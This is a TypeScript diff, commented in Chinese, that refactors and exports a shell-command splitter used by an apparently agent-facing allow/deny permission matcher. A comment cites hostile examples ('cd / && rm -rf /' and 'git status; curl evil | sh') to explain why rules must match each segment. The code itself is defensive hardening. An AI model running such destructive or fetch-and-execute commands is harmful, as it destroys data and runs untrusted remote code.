@@ -94,10 +94,21 @@ export function parseRule(raw: string): ParsedRule {
 }
 
 /**
- * 命令规则的匹配:先按 shell 连接符把命令拆成若干段,再逐段做通配匹配。
+ * 按 shell 连接符把命令拆成若干段。
  *
  * 为什么拆:整串匹配时 `*` 会跨过 `;`、`&&`、`|` 吃掉后半段,于是 deny `bash(rm *)`
  * 拦不住 `cd / && rm -rf /`,allow `bash(git *)` 反而放行 `git status; curl evil | sh`。
+ * 只读命令判定与命令前缀提取也用这份切分,三处口径必须一致。
+ */
+export function splitShellCommand(command: string): string[] {
+  return command
+    .split(/[;&|\n]+/)
+    .map((segment) => segment.trim())
+    .filter((segment) => segment !== '');
+}
+
+/**
+ * 命令规则的匹配:先按 shell 连接符把命令拆成若干段,再逐段做通配匹配。
  * 方向按类别取严:deny/ask 只要任一段命中即命中;allow 必须每一段都命中才放行。
  */
 function bashRuleMatch(pattern: string, command: string, mode: RuleMode): boolean {
@@ -109,14 +120,6 @@ function bashRuleMatch(pattern: string, command: string, mode: RuleMode): boolea
     return segments.every((segment) => shellGlobMatch(pattern, segment));
   }
   return segments.some((segment) => shellGlobMatch(pattern, segment));
-}
-
-/** 按 shell 连接符切分命令;引号内的分隔符不细分(过度切分只会让判定更保守)。 */
-function splitShellCommand(command: string): string[] {
-  return command
-    .split(/[;&|\n]+/)
-    .map((segment) => segment.trim())
-    .filter((segment) => segment !== '');
 }
 
 /** 文件规则的路径匹配:支持 ~ 展开、绝对路径、相对后缀与文件名兜底。 */
